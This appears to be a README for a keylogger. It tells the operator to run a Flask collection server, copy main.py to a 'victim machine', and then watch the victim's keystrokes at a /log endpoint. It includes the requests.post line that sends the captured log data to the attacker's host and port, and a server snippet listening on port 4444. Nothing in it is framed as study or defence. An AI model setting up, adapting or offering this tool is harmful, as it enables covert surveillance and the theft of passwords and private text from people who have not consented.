**Setup:**
1) Install Flask server on your host machine : pip install Flask
2) Run the server: python server.py
3) Transfer the main.py to victim machine
4) Run main.py on victim machine : python main.py
5) Accessing the Logs:
To view the logs collected by the server, follow these steps:
Open a Web Browser: Launch your preferred web browser (e.g., Chrome, Firefox, Safari).
Visit the URL: Enter the following URL in the address bar: "http://<hostIP>:<port>/log"
As soon as your victim starts typing your log file on your server will be updated. (if not refresh the page)
----------------------------------------------------------------------------------------------------------------
In the server.py file, you can change the port number to your desired value. For example:
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4444)

and In the main.py file, update the URL in the requests.post call to match the server's IP address and port number. For example:
**try:
    requests.post('http://<host_ip>:<port_number>/log', data={'log': log_data})**
Replace <host_ip> with the server's IP address and <port_number> with the port number specified in your server.py (e.g., 4444).
